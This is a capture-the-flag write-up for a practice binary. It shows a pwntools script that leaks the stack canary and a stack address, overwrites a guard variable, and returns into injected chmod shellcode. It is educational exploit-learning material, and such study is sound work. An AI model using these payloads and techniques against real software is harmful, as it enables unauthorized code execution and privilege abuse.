Once again this challenge was very awesome to practice and understand what happens even more, this time we are asked to "**Write a full exploit involving injecting shellcode, reverse engineering, and a method of tricking the challenge into executing your payload**".

The new part is the reverse engineering part, which was pretty straight forward and easy to solve, basically the binary doesn't return it will call exit directly instead avoiding any possibility to overwrite the return address, this is avoidable. The program is checking if a certain variable on the stack is equal to 0x19da9e59c82bf236, if it is equal to this value, we avoid the exit condition and hit the return statement.

All you need to do is to calculate the offset between your input buffer and the variable that is compared to the "secret value" (0x19da9e59c82bf236) and make sure in your payload you overwrite this variable with the right value.

Then it is the regular exploitation stuff, we leak the canary, leak a value on the stack, calculate the offset of the stack value with our input buffer which leaks our input buffer, then we put shellcode in our input buffer and return to it, there is this backdoor with the word "REPEAT" which will help us achieve this.

I solve the binary with the following shellcode. Note that i used a small shellcode because you need to overwrite the secret value somewhere in your payload restricting the size of it.

```
.global _start
.intel_syntax noprefix
_start:
	push 0x61
	push rsp
	pop rdi
	mov sil, 4
	mov al, 90
	syscall
```

And i automated everything using the following python script.

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template toddlerone_level4.0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('toddlerone_level4.0')
context.arch = "amd64"
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

# Read Shellcode
shellcode = b""
with open("3.bytes", "rb") as file:
    for i in file.readlines():
        shellcode += i

# Start Process
io = start()
padding_until_canary = 56
padding_until_return = padding_until_canary + 16
padding_until_bypass = 40
padding_until_stack = 64
substract_offset = 208 + 144
# Leak Canary
io.sendline(b"200")
payload = b"REPEAT" + b"A" * (padding_until_canary - len("REPEAT")) + b"*"
io.write(payload)
print(io.recvuntil(b"You said: "))
io.recvuntil(b"*")
LeakedCanary = u64(io.recvline()[:-2][:8][:-1].rjust(8, b"\x00"))
log.info(f"Leaked Canary = {hex(LeakedCanary)}")
# Leak Stack Address
io.sendline(b"200")
payload = b"REPEAT" + b"A" * (padding_until_stack - len("REPEAT") - 1) + b"*"
io.write(payload)
io.recvuntil(b"You said: ")
io.recvuntil(b"*")
LeakedStack = u64(io.recvline()[:-1].ljust(8, b"\x00")) - substract_offset
log.info(f"Leaked Stack : {hex(LeakedStack)}")
# Return to Shellcode
io.sendline(b"800")
payload = shellcode + b"\x90" * (padding_until_bypass - len(shellcode)) + p64(0x19da9e59c82bf236) + b"\x90" * (padding_until_canary - padding_until_bypass - len(p64(0x19da9e59c82bf236))) + p64(LeakedCanary) + b"\x90" * (padding_until_return - padding_until_canary - 8) + p64(LeakedStack)
io.write(payload)
# Interactive Process
io.interactive()
```